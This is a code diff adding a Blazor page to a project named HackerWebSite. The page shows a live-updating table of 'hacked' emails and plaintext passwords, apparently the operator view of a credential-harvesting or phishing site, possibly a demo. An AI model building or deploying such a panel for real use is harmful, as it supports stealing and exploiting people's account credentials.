@@ -1,0 +1,66 @@
+﻿@page "/Hackedlogin"
+@using HackerWebSite
+@using HackerWebSite.Data
+
+@inject ITableChangeBroadcastService HackedLoginService
+@implements IDisposable
+
+<h2>Hacked Credentials</h2>
+
+<p>This component fetches data from HackedLogins.</p>
+
+<table class="table table-striped">
+    <thead>
+        <tr>
+            <th>Id</th>
+            <th>Email</th>
+            <th>Password</th>
+        </tr>
+    </thead>
+    <tbody>
+        @foreach (var stock in hackedLogin)
+        {
+            <tr>
+                <td>@stock.Id</td>
+                <td>@stock.Email</td>
+                <td>@stock.Password</td>
+            </tr>
+        }
+    </tbody>
+</table>
+
+@code {
+    IList<LoginDTO> hackedLogin;
+
+    protected override void OnInitialized()
+    {
+        // Subscription to table record change events
+        this.HackedLoginService.OnHackedLoginChanged += this.HackedLoginChanged;
+        this.hackedLogin = this.HackedLoginService.GetCurrentValues();
+    }
+
+    // The event handler, will update the HTML view according to new stock value
+    private async void HackedLoginChanged(object sender, HackedLoginChangeEventArgs args)
+    {
+        var recordToupdate = this.hackedLogin.FirstOrDefault(x => x.Id == args.NewValue.Id);
+
+        if (recordToupdate == null)
+        {
+            this.hackedLogin.Add(args.NewValue);
+        }
+        //else
+        //{
+        //    recordToupdate.Price = args.NewValue.Price;
+        //}
+
+        await InvokeAsync(() =>
+        {
+            base.StateHasChanged();
+        });
+    }
+
+    public void Dispose()
+    {
+        this.HackedLoginService.OnHackedLoginChanged -= this.HackedLoginChanged;
+    }
+}
